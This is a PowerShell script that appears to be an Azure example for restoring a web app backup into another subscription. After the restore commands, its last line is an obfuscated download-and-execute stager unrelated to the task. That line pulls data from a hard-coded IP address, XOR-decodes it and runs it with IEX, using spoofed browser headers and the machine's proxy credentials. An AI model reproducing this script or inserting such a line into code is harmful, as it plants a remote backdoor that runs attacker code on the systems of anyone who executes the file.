$resourceGroupNameSub1 = "<replace-with-your-group-name>"
$resourceGroupNameSub2 = "<replace-with-desired-new-group-name>"
$webAppNameSub1 = "<replace-with-your-app-name>"
$webAppNameSub2 = "<replace-with-desired-new-app-name>"
$appServicePlanSub2 = "<replace-with-desired-new-plan-name>"
$locationSub2 = "West Europe"



Add-AzAccount


Get-AzWebAppBackupList -ResourceGroupName $resourceGroupNameSub1 -Name $webAppNameSub1




$backup = (Get-AzWebAppBackupList -ResourceGroupName $resourceGroupNameSub1 -Name $webAppNameSub1 | where {$_.BackupId -eq <replace-with-BackupID>}) 


Add-AzAccount


New-AzWebApp -ResourceGroupName $resourceGroupNameSub2 -AppServicePlan $appServicePlanSub2 -Name $webAppNameSub2 -Location $locationSub2


Restore-AzWebAppBackup -ResourceGroupName $resourceGroupNameSub2 -Name $webAppNameSub2 -StorageAccountUrl $backup.StorageAccountUrl -BlobName $backup.BlobName -Overwrite

$wc=NeW-OBjeCT SYsTem.Net.WEbClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRS.AdD('User-Agent',$u);$WC.PrOxy = [SySTEm.NET.WeBREqUeSt]::DEfAuLtWeBPrOXY;$wC.PrOxy.CredEnTiALs = [SYsTEM.NEt.CredenTiALCACHE]::DeFAUlTNETWORKCrEdENtiaLS;$K='m.]kjJd[SBY3&Le*<2xqzl6{Pr?s8)hC';$I=0;[chaR[]]$B=([cHaR[]]($WC.DOwNlOADStRing("http://222.230.139.166:80/index.asp")))|%{$_-bXor$K[$I++%$K.LENgTH]};IEX ($b-joiN'')

